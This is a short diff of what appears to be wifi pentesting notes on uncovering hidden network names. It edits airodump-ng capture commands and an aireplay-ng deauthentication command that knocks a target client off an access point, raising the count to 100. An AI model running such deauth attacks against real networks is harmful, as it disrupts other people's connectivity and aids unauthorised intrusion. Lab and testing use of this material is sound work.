@@ -21,14 +21,17 @@ airmon-ng start wlan1
 ```
 Save what's out there and save to a file:
 ```
-sudo airodump-ng wlan1mon --band agp -w dump
+airodump-ng wlan1mon --band agp -w dump
 ```
 ## Deauth
-If there are clients connected to hidden networks you can deauth them, then capture the request they send to re-connect which will contain the ESSID / network name. 
-
-Deauth target MAC (found in dump):
+If there are clients connected to hidden networks you can deauth them, then capture the request they send to re-connect which will contain the ESSID / network name.
+Run airodump live to see ESSID update:
 ```
-aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan1mon
+airodump-ng wlan1mon --band agp
+```
+Deauth target client MAC (`-c`) with AP MAC (`-a`)  (found in dump):
+```
+aireplay-ng -0 100 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan1mon
 ```
 
 ## Brute forcing hidden SSID
